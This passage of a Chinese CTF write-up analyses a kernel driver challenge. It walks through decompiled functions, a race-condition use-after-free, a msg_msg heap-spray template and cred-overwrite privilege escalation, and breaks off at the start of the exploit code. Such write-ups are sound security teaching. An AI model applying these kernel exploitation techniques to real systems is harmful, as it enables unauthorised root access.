rdx</span></span><br><span class="line">    __int64 v3; <span class="comment">// rsi</span></span><br><span class="line">    __int64 chunk; <span class="comment">// rbx</span></span><br><span class="line">    __int64 v5; <span class="comment">// rax</span></span><br><span class="line">    __int64 v7[<span class="number">3</span>]; <span class="comment">// [rsp+0h] [rbp-18h] BYREF</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( copy_from_user(v7, a1, <span class="number">0x10</span>LL) || v7[<span class="number">0</span>] &gt; <span class="number">0x400</span>uLL )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-22LL</span>;</span><br><span class="line">    v1 = _kmalloc(v7[<span class="number">0</span>] + <span class="number">0x18</span>, <span class="number">0x14202C0</span>LL);</span><br><span class="line">    size = v7[<span class="number">0</span>];</span><br><span class="line">    v3 = v7[<span class="number">1</span>];</span><br><span class="line">    *v1 = <span class="number">1</span>;</span><br><span class="line">    chunk = v1;</span><br><span class="line">    *(v1 + <span class="number">8</span>) = size;</span><br><span class="line">    <span class="keyword">if</span> ( copy_from_user(v1 + <span class="number">0x18</span>, v3, size) )</span><br><span class="line">    &#123;</span><br><span class="line">        kfree(chunk);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-22LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        mutex_lock(&amp;list_lock);</span><br><span class="line">        v5 = g_list;</span><br><span class="line">        g_list = chunk;</span><br><span class="line">        *(chunk + <span class="number">0x10</span>) = v5;</span><br><span class="line">        mutex_unlock(&amp;list_lock);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这里可以分析出申请堆块的参数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">create_chunk_arg</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">int</span> size;</span><br><span class="line">    <span class="keyword">char</span> *buf;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>以及堆块的结构：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">chunk</span>&#123;</span></span><br><span class="line">    inuse;</span><br><span class="line">    size;</span><br><span class="line">    prev;</span><br><span class="line">    buf;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">remove_item</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __int64 v1; <span class="comment">// rax</span></span><br><span class="line">    __int64 v2; <span class="comment">// rdx</span></span><br><span class="line">    __int64 v3; <span class="comment">// rdi</span></span><br><span class="line">    __int64 v5; <span class="comment">// rdi</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( a1 &gt;= <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        mutex_lock(&amp;list_lock);</span><br><span class="line">        <span class="keyword">if</span> ( !a1 )</span><br><span class="line">        &#123;</span><br><span class="line">            v5 = g_list;</span><br><span class="line">            <span class="keyword">if</span> ( g_list )</span><br><span class="line">            &#123;</span><br><span class="line">                g_list = *(g_list + <span class="number">16</span>);</span><br><span class="line">                put(v5);</span><br><span class="line">                mutex_unlock(&amp;list_lock);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">goto</span> LABEL_12;</span><br><span class="line">        &#125;</span><br><span class="line">        v1 = g_list;</span><br><span class="line">        <span class="keyword">if</span> ( a1 != <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> ( !g_list )</span><br><span class="line">            &#123;</span><br><span class="line">                LABEL_12:</span><br><span class="line">                mutex_unlock(&amp;list_lock);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">-22LL</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            v2 = <span class="number">1LL</span>;</span><br><span class="line">            <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">            &#123;</span><br><span class="line">                ++v2;</span><br><span class="line">                v1 = *(v1 + <span class="number">16</span>);</span><br><span class="line">                <span class="keyword">if</span> ( a1 == v2 )</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">if</span> ( !v1 )</span><br><span class="line">                    <span class="keyword">goto</span> LABEL_12;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        v3 = *(v1 + <span class="number">0x10</span>);</span><br><span class="line">        <span class="keyword">if</span> ( v3 )</span><br><span class="line">        &#123;</span><br><span class="line">            *(v1 + <span class="number">0x10</span>) = *(v3 + <span class="number">0x10</span>);</span><br><span class="line">            put(v3);</span><br><span class="line">            mutex_unlock(&amp;list_lock);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_12;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-22LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在删除函数可以看出来这里并没有直接kfree来进行删除，而是调用了put函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">put</span><span class="params">(<span class="keyword">volatile</span> <span class="keyword">signed</span> __int32 *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a1 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !_InterlockedDecrement(a1) )</span><br><span class="line">      <span class="keyword">return</span> kfree(a1);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而这个put函数就是对chunk的inuse位进行减一的操作，如果为0则进行kfree，结合上面的remove函数其中的脱链操作也是没有问题的，不存在UAF</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">select_item</span><span class="params">(__int64 a1, __int64 a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __int64 v2; <span class="comment">// rbx</span></span><br><span class="line">    __int64 v3; <span class="comment">// rax</span></span><br><span class="line">    __int64 *v4; <span class="comment">// rbp</span></span><br><span class="line"></span><br><span class="line">    mutex_lock(&amp;list_lock);</span><br><span class="line">    v2 = g_list;</span><br><span class="line">    <span class="keyword">if</span> ( a2 &gt; <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ( !g_list )</span><br><span class="line">        &#123;</span><br><span class="line">            LABEL_8:</span><br><span class="line">            mutex_unlock(&amp;list_lock);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-22LL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        v3 = <span class="number">0LL</span>;</span><br><span class="line">        <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">            ++v3;</span><br><span class="line">            v2 = *(v2 + <span class="number">0x10</span>);</span><br><span class="line">            <span class="keyword">if</span> ( a2 == v3 )</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">if</span> ( !v2 )</span><br><span class="line">                <span class="keyword">goto</span> LABEL_8;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( !v2 )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-22LL</span>;</span><br><span class="line">    get(v2);</span><br><span class="line">    mutex_unlock(&amp;list_lock);</span><br><span class="line">    v4 = *(a1 + <span class="number">0xC8</span>);</span><br><span class="line">    mutex_lock(v4 + <span class="number">1</span>);</span><br><span class="line">    put(*v4);</span><br><span class="line">    *v4 = v2;</span><br><span class="line">    mutex_unlock(v4 + <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再看select函数，这一函数实现的功能是选取一个chunk放到(fd+0xc8)位置。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 __fastcall <span class="title">list_head</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __int64 v1; <span class="comment">// rbx</span></span><br><span class="line">    <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// rbx</span></span><br><span class="line"></span><br><span class="line">    mutex_lock(&amp;list_lock);</span><br><span class="line">    get(g_list);</span><br><span class="line">    v1 = g_list;</span><br><span class="line">    mutex_unlock(&amp;list_lock);</span><br><span class="line">    v2 = -(copy_to_user(a1, v1, *(v1 + <span class="number">8</span>) + <span class="number">0x18</span>LL) != <span class="number">0</span>) &amp; <span class="number">0xFFFFFFFFFFFFFFEA</span>LL;</span><br><span class="line">    put(g_list);</span><br><span class="line">    <span class="keyword">return</span> v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>list_head函数则是取出chunk内容，这里的size是在create时放在堆块中的size。</p><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>题目中题看上去是没有任何问题的，但是在启动脚本中我们可以看到：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line"></span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">    -enable-kvm \</span><br><span class="line">    -cpu kvm64,+smep \</span><br><span class="line">    -kernel ./bzImage \</span><br><span class="line">    -append <span class="string">&quot;console=ttyS0 root=/dev/ram rw oops=panic panic=1 quiet kaslr&quot;</span> \</span><br><span class="line">    -initrd ./rootfs.cpio \</span><br><span class="line">    -nographic \</span><br><span class="line">    -m <span class="number">512</span>M \</span><br><span class="line">    -smp cores=<span class="number">2</span>,threads=<span class="number">2</span>,sockets=<span class="number">1</span> \</span><br><span class="line">    -monitor /dev/null \</span><br><span class="line">    -nographic \</span><br><span class="line">    -s</span><br></pre></td></tr></table></figure><p>启动了两个核心，虽然程序使用了互斥锁但任存在条件竞争漏洞</p><p>在create的入链操作中：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mutex_lock(&amp;list_lock);</span><br><span class="line">v5 = g_list;</span><br><span class="line">g_list = chunk;</span><br><span class="line">*(chunk + <span class="number">0x10</span>) = v5;</span><br><span class="line">mutex_unlock(&amp;list_lock);</span><br></pre></td></tr></table></figure><p>可以看到这里是首先上锁，然后进行操作</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mutex_lock(&amp;list_lock);</span><br><span class="line">get(g_list);</span><br><span class="line">v1 = g_list;</span><br><span class="line">mutex_unlock(&amp;list_lock);</span><br><span class="line">v2 = -(copy_to_user(a1, v1, *(v1 + <span class="number">8</span>) + <span class="number">0x18</span>LL) != <span class="number">0</span>) &amp; <span class="number">0xFFFFFFFFFFFFFFEA</span>LL;</span><br><span class="line">put(g_list);</span><br></pre></td></tr></table></figure><p>然而在list_head函数中是在获取了链中的第一个chunk就会释放锁，并且最后会进行put函数，如果我们能够在释放锁之后，put函数之前让create新建的chunk入链则会让新入链的chunk进入put函数，然而新chunk的inuse位为1，所以就会直接free掉，那么此时就存在了UAF的chunk了。</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>这里就接着看read和write函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">list_read</span><span class="params">(__int64 a1, __int64 a2, <span class="keyword">unsigned</span> __int64 a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __int64 *v5; <span class="comment">// r13</span></span><br><span class="line">    __int64 v6; <span class="comment">// rsi</span></span><br><span class="line">    _QWORD *v7; <span class="comment">// rdi</span></span><br><span class="line"></span><br><span class="line">    v5 = *(a1 + <span class="number">0xC8</span>);</span><br><span class="line">    mutex_lock(v5 + <span class="number">1</span>);</span><br><span class="line">    v6 = *v5;</span><br><span class="line">    <span class="keyword">if</span> ( *v5 )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ( *(v6 + <span class="number">8</span>) &lt;= a3 )</span><br><span class="line">            a3 = *(v6 + <span class="number">8</span>);</span><br><span class="line">        v7 = v5 + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> ( copy_to_user(a2, v6 + <span class="number">0x18</span>, a3) )</span><br><span class="line">        &#123;</span><br><span class="line">            mutex_unlock(v7);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-22LL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            mutex_unlock(v7);</span><br><span class="line">            <span class="keyword">return</span> a3;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        mutex_unlock(v5 + <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-22LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里可以看到read函数操作的chunk就是我们在select函数中放到(fd+0xc8)位置的chunk，并且只要我们传入的第三个参数不大于chunk中记录size的位置就可以进行读取</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">list_write</span><span class="params">(__int64 a1, __int64 a2, <span class="keyword">unsigned</span> __int64 a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __int64 *v4; <span class="comment">// rbp</span></span><br><span class="line">    __int64 v5; <span class="comment">// rdi</span></span><br><span class="line">    __int64 v6; <span class="comment">// rax</span></span><br><span class="line">    _QWORD *v7; <span class="comment">// rdi</span></span><br><span class="line"></span><br><span class="line">    v4 = *(a1 + <span class="number">0xC8</span>);</span><br><span class="line">    mutex_lock(v4 + <span class="number">1</span>);</span><br><span class="line">    v5 = *v4;</span><br><span class="line">    <span class="keyword">if</span> ( *v4 )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ( *(v5 + <span class="number">8</span>) &lt;= a3 )</span><br><span class="line">            a3 = *(v5 + <span class="number">8</span>);</span><br><span class="line">        v6 = copy_from_user(v5 + <span class="number">0x18</span>, a2, a3);</span><br><span class="line">        v7 = v4 + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> ( v6 )</span><br><span class="line">        &#123;</span><br><span class="line">            mutex_unlock(v7);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-22LL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            mutex_unlock(v7);</span><br><span class="line">            <span class="keyword">return</span> a3;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        mutex_unlock(v4 + <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-22LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>write函数类似于上面的read函数。</p><p>那么我们的思路就是覆盖上面chunk存放size的位置即可了，这样我们就可以实现任意地址写了。那么我们就需要用到堆喷的技术，内核的堆喷我的理解就是申请大量的chunk，那么大概率会一个chunk落在期望的位置上，而这道题目我们期望的位置也就是存在UAF的堆块的位置。这道题因为在init中的限制，这里选择的msgsnd进行堆喷，下面是进行堆喷的使用模板：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BUFF_SIZE 96-48</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="keyword">long</span> mtype;</span><br><span class="line">    <span class="keyword">char</span> mtext[BUFF_SIZE];</span><br><span class="line">&#125; msg;</span><br><span class="line"></span><br><span class="line"><span class="built_in">memset</span>(msg.mtext, <span class="number">0x42</span>, BUFF_SIZE<span class="number">-1</span>);</span><br><span class="line">msg.mtext[BUFF_SIZE] = <span class="number">0</span>;</span><br><span class="line">msg.mtype = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> msqid = msgget(IPC_PRIVATE, <span class="number">0644</span> | IPC_CREAT);</span><br><span class="line"></span><br><span class="line">msgsnd(msqid, &amp;msg, <span class="keyword">sizeof</span>(msg.mtext), <span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>在一次msgsnd的过程中会申请一个size为96的chunk，其中前面的48字节为不可控的内容</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">m_list</span>;</span></span><br><span class="line"><span class="keyword">long</span> m_type;</span><br><span class="line"><span class="keyword">size_t</span> m_ts;<span class="comment">/* message text size */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> *<span class="title">next</span>;</span></span><br><span class="line"><span class="keyword">void</span> *security;</span><br><span class="line"><span class="comment">/* the actual message follows immediately */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>好在msg_msg结构体的前16个字节为两个指针，并且后八位正好落在chunk的size位上，那么如果有一个msg_msg结构体落在了我们的UAF的chunk上我们就可以进行任意地址读写了。接着的思路就是提权，在前两篇的kernel文章中提到了三种提权方式，相比较下使用修改cred结构体的提权方式更为简单，不熟悉的朋友可以去看一下 <a href="https://cv196082.gitee.io/2022/08/03/kernel-pwn%E5%86%85%E5%AD%98%E4%BB%BB%E6%84%8F%E8%AF%BB%E5%86%99%E6%8F%90%E5%8D%87%E6%9D%83%E9%99%90/">kernel pwn 任意地址读写提升权限[1]</a>  <strong>不过这道题目即便是泄露了地址也无法计算当前chunk的地址与cred结构体的地址的偏移所以没法直接使用以前的方法</strong> 这里更好的办法是直接根据uid去寻找cred结构体，因为在上面那片文章cred结构体是通过kmem_cache_alloc创建的。</p><h3 id="综上，exp"><a href="#综上，exp" class="headerlink" title="综上，exp"></a>综上，exp</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/auxv.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BUFF_SIZE 96 - 48</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">struct chunk&#123;</span></span><br><span class="line"><span class="comment">    inuse</span></span><br><span class="line"><span class="comment">    size</span></span><br><span class="line"><span class="comment">    prev</span></span><br><span class="line"><span class="comment">    buf</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span 